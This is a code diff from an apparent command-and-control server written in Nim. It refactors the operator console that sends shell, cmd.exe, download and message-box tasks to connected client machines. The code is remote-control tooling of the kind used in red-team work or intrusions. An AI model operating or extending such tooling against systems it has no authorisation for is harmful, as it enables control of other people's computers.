@@ -9,10 +9,13 @@ importCommands() # import ../commands/[shell, msgbox, download]
 import types, logging
 
 proc procStdin*(server: C2Server) {.async.} =
-  var handlingClient: C2Client
-  var cmdMode = false
-      
-  prompt(handlingClient, cmdMode, server)
+
+  let c2cli = server.cli
+
+  c2cli.initialized = true
+
+  prompt(server)
+
   var messageFlowVar = spawn stdin.readLine()
   while true:
     if messageFlowVar.isReady():
@@ -23,11 +26,11 @@ proc procStdin*(server: C2Server) {.async.} =
       let cmd = args[0]
       let a_args = args[1..(argsn - 1)].join(" ")
 
-      if cmdMode:
+      if c2cli.shellMode:
         if cmd == "back":
-          cmdMode = false
+          c2cli.shellMode = false
         else:
-          let task = await shell.sendTask(handlingClient, input)
+          let task = await shell.sendTask(c2cli.handlingClient, input)
           await task.awaitResponse()
       else:
         case cmd:
@@ -128,10 +131,10 @@ proc procStdin*(server: C2Server) {.async.} =
                     stdout.styledWriteLine fgRed, "[-] ", $client, fgWhite
                 infoLog $len(server.clients) & " clients currently connected"
             of "info":
-              if handlingClient.isNil():
+              if c2cli.handlingClient.isNil():
                 errorLog "you need to interact with a client to use this command"
                 continue
-              echo @handlingClient
+              echo @(c2cli.handlingClient)
 
             # tasks management
 
@@ -144,11 +147,11 @@ proc procStdin*(server: C2Server) {.async.} =
             of "interact":
               for client in server.clients:
                 if client.id == parseInt(args[1]):
-                  handlingClient = client
-              if handlingClient.isNil() or handlingClient.id != parseInt(args[1]):
+                  c2cli.handlingClient = client
+              if c2cli.handlingClient.isNil() or c2cli.handlingClient.id != parseInt(args[1]):
                 infoLog "client not found"
             of "back": 
-              handlingClient = nil
+              c2cli.handlingClient = nil
             of "exit":
               for tcpListener in server.tcpListeners:
                 tcpListener.running = false
@@ -158,38 +161,38 @@ proc procStdin*(server: C2Server) {.async.} =
             # client commands
 
             of "download":
-              if handlingClient.isNil():
+              if c2cli.handlingClient.isNil():
                 errorLog "you need to interact with a client to use this command"
                 continue
-              let task = await download.sendTask(handlingClient, args[1])
+              let task = await download.sendTask(c2cli.handlingClient, args[1])
               await task.awaitResponse()
             of "shell":
-              if handlingClient.isNil():
+              if c2cli.handlingClient.isNil():
                 errorLog "you need to interact with a client to use this command"
                 continue
               if argsn == 1:
                 infoLog "type 'back' to exit shell mode"
-                cmdMode = true
+                c2cli.shellMode = true
                 continue
-              let task = await shell.sendTask(handlingClient, a_args)
+              let task = await shell.sendTask(c2cli.handlingClient, a_args)
               await task.awaitResponse()
             of "cmd":
-              if handlingClient.isNil():
+              if c2cli.handlingClient.isNil():
                 errorLog "you need to interact with a client to use this command"
                 continue
-              let task = await shell.sendTask(handlingClient, "cmd.exe /c " & a_args)
+              let task = await shell.sendTask(c2cli.handlingClient, "cmd.exe /c " & a_args)
               await task.awaitResponse()
             of "msgbox":
-              if handlingClient.isNil():
+              if c2cli.handlingClient.isNil():
                 errorLog "you need to interact with a client to use this command"
                 continue
               if argsn >= 3:
                 let slashSplit = a_args.split("/")
-                discard await msgbox.sendTask(handlingClient, slashSplit[1].strip(), slashSplit[0].strip())
+                discard await msgbox.sendTask(c2cli.handlingClient, slashSplit[1].strip(), slashSplit[0].strip())
               else:
                 echo "wrong usage. msgbox (title) / (caption)"
 
-      prompt(handlingClient, cmdMode, server)
+      prompt(server)
       messageFlowVar = spawn stdin.readLine()
       
     await asyncdispatch.sleepAsync(100)
